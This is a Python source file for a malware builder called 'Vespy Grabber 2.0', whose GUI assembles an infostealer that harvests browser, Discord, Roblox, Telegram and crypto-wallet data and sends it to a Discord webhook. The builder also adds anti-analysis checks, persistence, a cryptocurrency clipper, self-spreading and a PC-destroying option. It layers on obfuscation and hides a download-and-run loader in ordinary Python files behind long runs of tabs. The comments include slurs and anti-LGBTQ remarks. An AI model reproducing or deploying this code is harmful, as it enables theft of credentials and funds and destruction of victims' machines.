# If you dont like how I code, idgaf, kys - vesper & NTX
# We do not svpp0rt LGBTQ
import os, webbrowser, Rungui, requests, random, string, base64, marshal, pickle, zlib, shutil, codecs, lzma, gzip
from time import sleep
from PIL import ImageTk, ImageSequence
from tkinter import *
from pyperclip import copy
from threading import Thread
from tkinter import messagebox
from discord_webhook import DiscordWebhook, DiscordEmbed
from tkinter.filedialog import askopenfilename

backg,backg1,backg2,backg3,backg4,menu,setup,compilee,about,trybu,BTC,blankbu,fullbu,testbu,browsebu,compilebu,toolybu,mainmsg,msg1,yay1,ohno1,msg2,yay2,ohno2,msg3,yay3,ohno3,yay4,finalyay,backg5,backg6,savebu,backg7,selectbu,bgrotool1,backbu,nextbu,bgrotool2,robloxcookiecheck,checkbu,infobu,discotools,encodebu,copybu,encodewbhbg,webhookspammerbg,deletebu,startbu,accnukerbg,loginbu,addbu,sendbu,groupfindbg,clothingstealerbg,n3xtbu,b4ckbu,options1bg,options2bg,msgclipper,window = Rungui.Loadgui()

class Builder:
    
    def __init__(self,browserR,discordR,robloxR,filesR,minecraftR,networkI,obfuscateS,webhookJ,antiD,rebootP,startupP,errorM,pingH,discordS,exodusS,telegramS,antivmS,hideS,NUKEPCHAHAHA,customMsgDS,customMsgError,compiletoexe,hidepayloadb,PYTHONDHTEXT,DISCORDINJECTION,cryptoCLIPPA,cryptoBITCOIN,cryptoETH,wbh,name,icon):
        Thread(target=self._Balls,args=(69,)).start()
        Thread(target=self._Balls,args=(0,)).start()
        WEB_INTO_THE_HOOK_YEAAAH = requests.get(wbh).text
        if WEB_INTO_THE_HOOK_YEAAAH.startswith(f"{chr(51)}"):
            while True:
                try:WEB_INTO_THE_HOOK_YEAAAH=__import__(f'{chr(108)}{chr(122)}{chr(109)}{chr(97)}').decompress(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b16decode(__import__(f'{chr(99)}{chr(111)}{chr(100)}{chr(101)}{chr(99)}{chr(115)}').decode(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b85decode(WEB_INTO_THE_HOOK_YEAAAH.strip().split(f'{chr(51)}{chr(43)}')[1].encode()).decode(),f'{chr(114)}{chr(111)}{chr(116)}{chr(49)}{chr(51)}').encode())).decode()
                except:break
        webhook = DiscordWebhook(url=WEB_INTO_THE_HOOK_YEAAAH, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
        embed = DiscordEmbed(title=f"Grabber Compiled", description=f"Options Chose", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        self.FILE = open(f"Compiled/{name}.py","w+")
        Thread(target=self._Balls,args=(1,)).start()
        self.FILE.write(open("utils/Imports.py","r").read()+"\n")
        if webhookJ:
            embed.add_embed_field(name=f"Webhook Junk : ", value=f":white_check_mark:")
            self.FILE.write(self._webhooksJUNK(False))
            Thread(target=self._Balls,args=(4,)).start()
        else:
            embed.add_embed_field(name=f"Webhook Junk : ", value=f":x:")
        # Without obf it decodes like this (if webhook is encoded) --> lzma.decompress(base64.b16decode(codecs.decode(zlib.decompress(base64.b85decode(wbh.split('3+')[1].encode())).decode(),"rot13").encode())).decode()
        # same method for your sharetext link
        self.FILE.write(r"""wbh = str(requests.get(__import__(f'{chr(108)}{chr(122)}{chr(109)}{chr(97)}').decompress(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b16decode(__import__(f'{chr(99)}{chr(111)}{chr(100)}{chr(101)}{chr(99)}{chr(115)}').decode(__import__(f'{chr(122)}{chr(108)}{chr(105)}{chr(98)}').decompress(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b85decode("""+f""""{base64.b85encode(zlib.compress(codecs.encode(base64.b16encode(lzma.compress(str(wbh).encode())).decode(), "rot13").encode())).decode()}".encode()))"""+r""".decode(),f'{chr(114)}{chr(111)}{chr(116)}{chr(49)}{chr(51)}').encode())).decode()).text)
if wbh.startswith(f"{chr(51)}"):
    while True:
        try:wbh=__import__(f'{chr(108)}{chr(122)}{chr(109)}{chr(97)}').decompress(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b16decode(__import__(f'{chr(99)}{chr(111)}{chr(100)}{chr(101)}{chr(99)}{chr(115)}').decode(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b85decode(wbh.strip().split(f'{chr(51)}{chr(43)}')[1].encode()).decode(),f'{chr(114)}{chr(111)}{chr(116)}{chr(49)}{chr(51)}').encode())).decode()
        except:break
""")
        if webhookJ:
            self.FILE.write(self._webhooksJUNK(True)+"\n")
        self.FILE.write("dtokens = []\nrocookies = []\nropasswords = []\ndispasswords = []\n")
        self.FILE.write("""
try:
    os.mkdir(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"))
    P4THF0LDR = os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}")
except:
    try:
        shutil.rmtree(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"))
        os.mkdir(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"))
        P4THF0LDR = os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}")
    except:
        pass
        """)
        if browserR:
            embed.add_embed_field(name=f"Browser Recovery : ", value=f":white_check_mark:")
            self.FILE.write("\n"+open("utils/Browser.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Browser Recovery : ", value=f":x:")
            self.FILE.write("\nclass CookieInfo:\n\tpass\nclass Browsers():\n\tdef __repr__(self):\n\t\t"+r"return '''\n``|``'''"+"\n")
        if webhookJ:
            self.FILE.write(self._webhooksJUNK(True)+"\n")
        if discordR:
            embed.add_embed_field(name=f"Discord Recovery : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/Discord.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Discord Recovery : ", value=f":x:")
            self.FILE.write("class DISCORD:\n\tpass\n")
        if telegramS:
            embed.add_embed_field(name=f"Telegram Recovery : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/Telegram.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Telegram Recovery : ", value=f":x:")
            self.FILE.write("class Telegram():\n\tdef __repr__(self):\n\t\t"+r"return '''\n``|``'''"+"\n")
        if exodusS:
            embed.add_embed_field(name=f"Exodus Recovery : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/Exodus.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Exodus Recovery : ", value=f":x:")
            self.FILE.write("class EXodus():\n\tdef __repr__(self):\n\t\t"+r"return '''\n``|``'''"+"\n")
        if robloxR:
            embed.add_embed_field(name=f"Roblox Recovery : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/Roblox.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Roblox Recovery : ", value=f":x:")
            self.FILE.write("class Roblox:\n\tdef __repr__(self):\n\t\t"+r"return '''\n``|``'''"+"\n")
        if webhookJ:
            self.FILE.write(self._webhooksJUNK(True)+"\n")
        if DISCORDINJECTION:
            embed.add_embed_field(name=f"Discord Injection : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/DiscordInjection.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Discord Injection : ", value=f":x:")
            self.FILE.write("class Injection:\n\tpass\n")
        if filesR:
            embed.add_embed_field(name=f"Files Recovery : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/Files.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Files Recovery : ", value=f":x:")
            self.FILE.write("class Files:\n\tpass\n")
        if minecraftR:
            embed.add_embed_field(name=f"Minecraft Recovery : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/Minecraft.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Minecraft Recovery : ", value=f":x:")
            self.FILE.write("class Minecraft:\n\tdef __repr__(self):\n\t\t"+r"return '''\n``|``'''"+"\n")
        if networkI:
            embed.add_embed_field(name=f"Network Info : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/Network.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Network Info : ", value=f":x:")
            self.FILE.write("class Network:\n\tpass\n")
        if antiD:
            embed.add_embed_field(name=f"Anti Debug : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/AntiDebug.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Anti Debug : ", value=f":x:")
            self.FILE.write("class Antidebug:\n\tpass\n")
        if webhookJ:
            self.FILE.write(self._webhooksJUNK(True)+"\n")
        if antivmS:
            embed.add_embed_field(name=f"Anti VM : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/AntiVM.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Anti VM : ", value=f":x:")
            self.FILE.write("class AntiVM:\n\tpass\n")
        if hideS:
            embed.add_embed_field(name=f"Hide : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/Hide.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Hide : ", value=f":x:")
            self.FILE.write("class Hide:\n\tpass\n")
        if NUKEPCHAHAHA:
            embed.add_embed_field(name=f"NukePC : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/N3ke.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"NukePC : ", value=f":x:")
            self.FILE.write("class N3ke:\n\tpass\n")
        if rebootP:
            embed.add_embed_field(name=f"Reboot : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/Reboot.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Reboot : ", value=f":x:")
            self.FILE.write("class Reboot:\n\tpass\n")
        if cryptoCLIPPA:
            embed.add_embed_field(name=f"Clipper : ", value=f":white_check_mark:")
            # Epic hacker crypto clipper
            Thread(target=self._Balls,args=(12,)).start()
            CONTENT = open("utils/Clipper.py","r+").read()
            CONTENT=CONTENT.replace('self.BAYTEECEE = ""',f'self.BAYTEECEE = "{cryptoBITCOIN}"')
            CONTENT=CONTENT.replace('self.ETHH = ""',f'self.ETHH = "{cryptoETH}"')
            open("Compiled/Thecl1pp3r.py",'w').write(CONTENT)
            if obfuscateS:
                self._Obfuscation("Thecl1pp3r")
            self._Compile("assets/executable.ico","Thecl1pp3r")
            file = requests.post('https://api.anonfiles.com/upload',files={'file':open(f"Compiled/Thecl1pp3r.exe","rb")}).json()['data']['file']['url']['full']
            r=str(requests.get(file).content).split('class="btn btn-primary btn-block"')[1].split('href="')[1].split('">')[0]
            CONTENT2 = open("utils/ClipperClass.py",'r+').read()
            CONTENT2=CONTENT2.replace('file=requests.get("").content',f'file=requests.get("{r}").content')
            try:
                os.remove("Thecl1pp3r.exe")
                os.remove("Thecl1pp3r.py")
            except:
                pass
            self.FILE.write(CONTENT2+"\n")
        else:
            embed.add_embed_field(name=f"Clipper : ", value=f":x:")
            self.FILE.write("class Cl1ppa:\n\tpass\n")
        if startupP:
            embed.add_embed_field(name=f"Startup : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/Startup.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Startup : ", value=f":x:")
            self.FILE.write("class Startup:\n\tpass\n")
        if errorM:
            embed.add_embed_field(name=f"Error Message : ", value=f":white_check_mark:")
            CODEE = open("utils/ErrorMSG.py",'r').read()
            CODEE = CODEE.replace('error = ""',f'error = "{customMsgError}"')
            self.FILE.write(CODEE+"\n")
        else:
            embed.add_embed_field(name=f"Error Message : ", value=f":x:")
            self.FILE.write("class ErrorMsg:\n\tpass\n")
        if discordS:
            embed.add_embed_field(name=f"Discord Spreading : ", value=f":white_check_mark:")
            CODE = open("utils/DiscordSpreading.py",'r').read()
            CODE = CODE.replace('self.message = ""',f'self.message = "{customMsgDS}"')
            self.FILE.write(CODE+"\n")
        else:
            embed.add_embed_field(name=f"Discord Spreading : ", value=f":x:")
            self.FILE.write("class Spread:\n\tpass\n")
        if webhookJ:
            self.FILE.write(self._webhooksJUNK(True)+"\n")
        Maincode = open("utils/Main.py",'r').read()
        if pingH:
            embed.add_embed_field(name=f"Ping : ", value=f":white_check_mark:")
            Maincode = Maincode.replace("jtjirjihirthr = False","jtjirjihirthr = True")
        else:
            embed.add_embed_field(name=f"Ping : ", value=f":x:")
        self.FILE.write(Maincode+"\n")
        self.FILE.write(r"""
def zipette():
    shutil.make_archive(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"),'zip',os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"))
def main():
    Antidebug()
    AntiVM()
    Startup()
    Hide()
    Thread(target=ErrorMsg).start()
    Thread(target=Cl1ppa).start()
    Screeny()
    content = f":open_file_folder: ``GRABBED_{user}``"
    content += str(Browsers())
    content += str(Roblox())
    content += str(EXodus())
    content += str(Minecraft())
    content += str(Telegram())
    content += "\n``|_ END``"
    zipette()
    webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
    webhook.add_file(file=open(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}.zip"),'rb').read(),filename=f"GRABBED_{user}.zip")
    webhook.execute()
    webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
    embed = DiscordEmbed(title=f"Info Grabbed of user : ``{user}``", description=content, color='4300d1')
    embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
    embed.set_footer(text='Vespy 2.0 | by : vesper')
    embed.set_timestamp()
    webhook.add_embed(embed)
    webhook.execute()
    os.remove(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}.zip"));shutil.rmtree(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"))
    try:
        CookieInfo(rocookies)
    except:
        pass
    DISCORD()
    Thread(target=Injection).start()
    Files()
    Network()
    Spread()
    N3ke()
    Reboot()
main()
""")
        if webhookJ:
            self.FILE.write(self._webhooksJUNK(True)+"\n")
        self.FILE.close()
        if obfuscateS:
            try:
                self._Obfuscation(name)
                embed.add_embed_field(name=f"Obfuscate : ", value=f":white_check_mark:")
                Thread(target=self._Balls,args=(2,)).start()
            except:
                embed.add_embed_field(name=f"Obfuscation Failed : ", value=f":white_check_mark:")
                Thread(target=self._Balls,args=(3,)).start()
        else:
            embed.add_embed_field(name=f"Obfuscate : ", value=f":x:")
        if compiletoexe:
            Thread(target=self._Balls,args=(5,)).start()
            self._Compile(icon = icon, name = name)
            Thread(target=self._Balls,args=(7,)).start()
            if hidepayloadb:
                Thread(target=self._Balls,args=(8,)).start()
                if os.path.exists(PYTHONDHTEXT):
                    file = requests.post('https://api.anonfiles.com/upload',files={'file':open(f"Compiled/{name}.exe","rb")}).json()['data']['file']['url']['full']
                    r=str(requests.get(file).content).split('class="btn btn-primary btn-block"')[1].split('href="')[1].split('">')[0]
                    CODE = self._OnelineObf(r)
                    A=open(PYTHONDHTEXT,'r+').readlines()
                    try:
                        filename = str(PYTHONDHTEXT).split("/")[-1]
                    except:
                        filename = "Infected.py"
                    newcode = ""
                    c=0
                    for I in A:
                        if c==0:
                            newcode += f'''{I.strip()}\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t'''+fr''';{CODE}'''+"\n"
                        else:
                            newcode += I
                        c+=1
                    open(f"Compiled/Infected_{filename}","w+").write(newcode)
                    Thread(target=self._Balls,args=(9,)).start()
                else:
                    Thread(target=self._Balls,args=(10,)).start()
        webhook.add_embed(embed)
        webhook.execute()
        if NUKEPCHAHAHA:
            try:
                os.mkdir("Compiled/Stub")
                shutil.move(f"{os.getcwd()}\\Compiled\\{name}.exe", f"{os.getcwd()}\\Compiled\\Stub\\{name}.exe")
                shutil.make_archive("Compiled/Stub","zip","Compiled/Stub")
                shutil.rmtree("Compiled/Stub")
            except:
                pass
        Thread(target=self._Balls,args=(11,)).start()
        messagebox.showinfo("Vespy Grabber 2.0 || @i_might_be_vesper","Grabber Successfully Compiled. Go log some kids now bitch")
        Menu()
    
    def _Balls(self,balls):
        # for compiling gui
        if balls == 69:
            bg = Label(window, image=backg5,borderwidth=0)
            bg.place(x=156, y=62)
        if balls == 0:
            yurr = Label(window, image=mainmsg,bg='#101010')
            yurr.place(x=194,y=97)
        if balls == 1:
            yurrr = Label(window, image=msg1,bg='#101010')
            yurrr.place(x=194,y=120)
        if balls == 2:
            yurrrr = Label(window, image=yay1,bg='#101010')
            yurrrr.place(x=194,y=166)
        if balls == 3:
            yurrrrr = Label(window, image=ohno1,bg='#101010')
            yurrrrr.place(x=194,y=166)
        if balls == 4:
            yurrrrrr = Label(window, image=yay2,bg='#101010')
            yurrrrrr.place(x=194,y=189)
        if balls == 5:
            yurrrrrrr = Label(window, image=msg2,bg='#101010')
            yurrrrrrr.place(x=194,y=212)
        if balls == 6:
            yurrrrrrrr = Label(window, image=ohno3,bg='#101010')
            yurrrrrrrr.place(x=194,y=235)
        if balls == 7:
            yurrrrrrrrr = Label(window, image=yay3,bg='#101010')
            yurrrrrrrrr.place(x=194,y=258)
        if balls == 8:
            yurrrrrrrrrr = Label(window, image=msg3,bg='#101010')
            yurrrrrrrrrr.place(x=194,y=281)
        if balls == 9:
            yurrrrrrrrrrr = Label(window, image=yay4,bg='#101010')
            yurrrrrrrrrrr.place(x=194,y=304)
        if balls == 10:
            yurrrrrrrrrrrr = Label(window, image=ohno2,bg='#101010')
            yurrrrrrrrrrrr.place(x=194,y=304)
        if balls == 11:
            yurrrrrrrrrrrrr = Label(window, image=finalyay,bg='#101010')
            yurrrrrrrrrrrrr.place(x=194,y=327)
        if balls == 12:
            yurrrrrrrrrrrrrr = Label(window, image=msgclipper,bg='#101010')
            yurrrrrrrrrrrrrr.place(x=194,y=143)

    def _webhooksJUNK(self, writed):
        junkcode = ""
        if writed:
            hooksname = ["real_webhook","thewebhook","webh","fake_webhook","fake_wbh","webHOOK"]
        else:
            hooksname = ["wbh", "real_webhook","thewebhook","webh","fake_webhook","fake_wbh","webHOOK"]
        hookstype = ["https://discord.com/api/webhooks/","https://discordapp.com/api/webhooks/","https://ptb.discord.com/api/webhooks/","https://canary.discord.com/api/webhooks/"]
        hookslenght = [68,67,66,65]
        lastpart = "-"
        lstpart = "_"
        for _ in range(45):
            hook = f"{random.choice(hooksname)} = "+f"'{random.choice(hookstype)}1"+''.join(random.choice(string.digits) for _ in range(18))+"/"+''.join(random.choice(string.digits+string.ascii_lowercase+string.ascii_uppercase+lastpart+lstpart) for _ in range(random.choice(hookslenght)))+"'"
            junkcode+=f"{hook}\n"
        return junkcode
    
    def _OnelineObf(self, link:str):
        filename = link.split("/")[-1]
        code = r"""open(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\"""+f"""{filename}","wb").write(requests.get("{link}").content);"""+r"""os.system(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\"""+f"""{filename}")"""
        code = f"""import os,getpass,base64,requests;user=getpass.getuser();eval(compile(base64.b64decode({base64.b64encode(code.encode())}),"<string>","""+"""f"{chr(101)}{chr(120)}{chr(101)}{chr(99)}"))"""
        return code

    def _Obfuscation(self, name):
        # Simple Obf v2, still pretty shit but yeah lol
        for _ in range(3):
            CONTENT = open(f"Compiled/{name}.py","r").read()
            A="S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0______WTFFF___" * 5
            B = r"\xff\xfeW\x00T\x00F\x00_\x00T\x00H\x001\x00S\x00_\x00_\x00C\x000\x00D\x003\x00_\x00_\x00_\x00_\x001\x00S\x00_\x00_\x00_\x00S\x000\x00_\x00_\x00_\x00_\x00F\x00U\x00C\x00K\x00I\x00N\x00G\x00_\x00_\x00_\x00W\x003\x001\x00R\x00D\x00_\x00_\x00_\x00_\x00_\x00_\x00B\x00R\x000\x00_\x00_\x00_\x00_\x00_\x00" * 5
            C = f"{A}=b'{B}'\n"*1
            def S1MPL3(code:str,wall:bool):
                if wall:POOP = codecs.encode(base64.b16encode(zlib.compress(pickle.dumps(marshal.dumps(compile(code.encode(),f"SIMPLE ASF","exec"))))).decode(),"rot13")
                else:POOP=base64.b16encode(zlib.compress(pickle.dumps(marshal.dumps(compile(code.encode(),f"SIMPLE ASF","exec"))))).decode()
                CONTENT = f"""# Couldnt decompile all the code.\n{open("utils/Imports.py","r").read()}\n__Obf__="Simple Obf v2"\n__Obf__="Simple Obf v2"\n__Obf__="Simple Obf v2"\n__Obf__="Simple Obf v2"\n__Obf__="Simple Obf v2"
"""+f"""S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___ = '{POOP}'"""+"""
"""+f"""{C}"""+r"""
"""+f"""{C}"""+r"""
"""+f"""{C}"""
                if wall:
                    CONTENT+=r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=__import__(f"{chr(99)}{chr(111)}{chr(100)}{chr(101)}{chr(99)}{chr(115)}").decode(S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___,f"{chr(114)}{chr(111)}{chr(116)}{chr(49)}{chr(51)}")
"""+f"""{C}"""+r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=__import__(f"{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}").b16decode(S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___)
"""+f"""{C}"""
                else:
                    CONTENT+=r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=__import__(f"{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}").b16decode(S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___)
"""+f"""{C}"""
                CONTENT+=r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=__import__(f"{chr(122)}{chr(108)}{chr(105)}{chr(98)}").decompress(S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___)
"""+f"""{C}"""+r"""
"""+f"""{C}"""+r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=__import__(f"{chr(112)}{chr(105)}{chr(99)}{chr(107)}{chr(108)}{chr(101)}").loads(S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___)
"""+f"""{C}"""+r"""
S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=__import__(f"{chr(98)}{chr(117)}{chr(105)}{chr(108)}{chr(116)}{chr(105)}{chr(110)}{chr(115)}").exec(__import__(f"{chr(109)}{chr(97)}{chr(114)}{chr(115)}{chr(104)}{chr(97)}{chr(108)}").loads(S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___))
"""+f"""{C}"""+r"""
"""+f"""{C}"""+r"""
"""+f"""{C}"""+r"""
"""
                return CONTENT
            obf_content = S1MPL3(CONTENT,True)
            obf_content = S1MPL3(obf_content,False)
            with open(f"Compiled/{name}.py","w+") as f:f.write(obf_content);f.close()
    
    def _Compile(self, icon, name):
        UPX = "./utils"
        if icon == "":
            os.system(f"pyinstaller --onefile --name {name} --noconsole --upx-dir={UPX} --clean Compiled/{name}.py")
        else:
            if os.path.exists(icon):
                os.system(f"pyinstaller --onefile --name {name} --upx-dir={UPX} --icon {icon} --noconsole --clean Compiled/{name}.py")
            else:
                Thread(target=self._Balls,args=(6,)).start()
                os.system(f"pyinstaller --onefile --name {name} --upx-dir={UPX} --noconsole --clean Compiled/{name}.py")
        try:
            shutil.move(f"{os.getcwd()}\\dist\\{name}.exe", f"{os.getcwd()}\\Compiled\\{name}.exe")
        except:pass
        try:
            shutil.rmtree('build')
        except:pass
        try:
            shutil.rmtree('dist')
        except:pass
        try:
            shutil.rmtree('__pycache__')
        except:pass
        try:
            os.remove(f'{name}.spec')
        except:pass
        try:
            os.remove(f'{name}.py')
        except:pass

class Menu:
    
    def __init__(self):
        self.browserR = False
        self.discordR = False
        self.robloxR = False
        self.filesR = False
        self.minecraftR = False
        self.networkI = False
        self.obfuscateS = False
        self.webhookJ = False
        self.antiD = False
        self.rebootP = False
        self.startupP = False
        self.errorM = False
        self.pingH = False
        self.discordS = False
        self.telegramS = False
        self.exodusS = False
        self.antivmS = False
        self.hideS = False
        self.NUKEPCHAHAHA = False
        self.compiletoexe = False
        self.keeppythonfile = False
        self.hidepayloadb = False
        self.rocookiealliinfo = False
        self.AddEMbed = False
        self.DISCORDINJECTION = False
        self.cryptoCLIPPA = False
        self.cryptoBITCOIN = ""
        self.cryptoETH = ""
        self.WEBHOOKTEXT = ""
        self.NAMETEXT = ""
        self.ICONPATHTEXT = ""
        self.PYTHONDHTEXT = ""
        self.customMsgDS = ""
        self.customMsgError = ""
        self.TOOLWEBHOOK = ""
        self._background()

    def _background(self):
        bg = Label(window, image=backg,borderwidth=0)
        bg.place(x=0, y=0)
        self.menuBUTTON = Button(window, image=menu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._menu)
        self.menuBUTTON.place(x=58,y=171)
        self.setupBUTTON = Button(window, image=setup,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._setup)
        self.setupBUTTON.place(x=58,y=221)
        self.compileBUTTON = Button(window, image=compilee,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._compile)
        self.compileBUTTON.place(x=58,y=271)
        self.aboutBUTTON = Button(window, image=about,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._about)
        self.aboutBUTTON.place(x=58,y=401)
        self.toolSS = Button(window, image=toolybu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._tools)
        self.toolSS.place(x=58,y=349)
        self._menu()

    def _menu(self):
        bg2 = Label(window, image=backg1,borderwidth=0)
        bg2.place(x=156, y=62)
    
    def _brsetup(self):
        if self.browserR:
            self.BrowserR.config(image=blankbu)
            self.browserR = False
        else:
            self.BrowserR.config(image=fullbu)
            self.browserR = True
    
    def _drsetup(self):
        if self.discordR:
            self.DiscordR.config(image=blankbu)
            self.discordR = False
        else:
            self.DiscordR.config(image=fullbu)
            self.discordR = True
    
    def _rrsetup(self):
        if self.robloxR:
            self.RobloxR.config(image=blankbu)
            self.robloxR = False
        else:
            self.RobloxR.config(image=fullbu)
            self.robloxR = True
    
    def _frsetup(self):
        if self.filesR:
            self.FilesR.config(image=blankbu)
            self.filesR = False
        else:
            self.FilesR.config(image=fullbu)
            self.filesR = True
    
    def _mrsetup(self):
        if self.minecraftR:
            self.MinecraftR.config(image=blankbu)
            self.minecraftR = False
        else:
            self.MinecraftR.config(image=fullbu)
            self.minecraftR = True
    
    def _nisetup(self):
        if self.networkI:
            self.NetworkI.config(image=blankbu)
            self.networkI = False
        else:
            self.NetworkI.config(image=fullbu)
            self.networkI = True

    def _ossetup(self):
        if self.obfuscateS:
            self.ObfuscateS.config(image=blankbu)
            self.obfuscateS = False
        else:
            self.ObfuscateS.config(image=fullbu)
            self.obfuscateS = True
    
    def _wjsetup(self):
        if self.webhookJ:
            self.WebhookJ.config(image=blankbu)
            self.webhookJ = False
        else:
            self.WebhookJ.config(image=fullbu)
            self.webhookJ = True
    
    def _adsetup(self):
        if self.antiD:
            self.AntiD.config(image=blankbu)
            self.antiD = False
        else:
            self.AntiD.config(image=fullbu)
            self.antiD = True
    
    def _rpsetup(self):
        if self.rebootP:
            self.RebootP.config(image=blankbu)
            self.rebootP = False
        else:
            self.RebootP.config(image=fullbu)
            self.rebootP = True

    def _spsetup(self):
        if self.startupP:
            self.StartupP.config(image=blankbu)
            self.startupP = False
        else:
            self.StartupP.config(image=fullbu)
            self.startupP = True
    
    def _emsetup(self):
        if self.errorM:
            self.ErrorM.config(image=blankbu)
            self.errorM = False
        else:
            self.ErrorM.config(image=fullbu)
            self.errorM = True
    
    def _telesetup(self):
        if self.telegramS:
            self.TELEGRAMS.config(image=blankbu)
            self.telegramS = False
        else:
            self.TELEGRAMS.config(image=fullbu)
            self.telegramS = True
    
    def _exosetup(self):
        if self.exodusS:
            self.EXODUSS.config(image=blankbu)
            self.exodusS = False
        else:
            self.EXODUSS.config(image=fullbu)
            self.exodusS = True
    
    def _antivmsetup(self):
        if self.antivmS:
            self.ANTIVMS.config(image=blankbu)
            self.antivmS = False
        else:
            self.ANTIVMS.config(image=fullbu)
            self.antivmS = True
    
    def _hideitselfsetup(self):
        if self.hideS:
            self.HIDEHAHA.config(image=blankbu)
            self.hideS = False
        else:
            self.HIDEHAHA.config(image=fullbu)
            self.hideS = True
    
    def _NUKEsetup(self):
        if self.NUKEPCHAHAHA:
            self.NUKETHATLGBTQ.config(image=blankbu)
            self.NUKEPCHAHAHA = False
        else:
            self.NUKETHATLGBTQ.config(image=fullbu)
            self.NUKEPCHAHAHA = True
            messagebox.showinfo("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003","Warning, this option can be very dangerous. We recommend to use this option only on a Virtual Machine device, VPS or an RDP\n\nThis option will ZIP the stub, so you dont missclick and open the stub by accident on your device.")

    def _dssetup(self):
        if self.discordS:
            self.DiscordS.config(image=blankbu)
            self.discordS = False
        else:
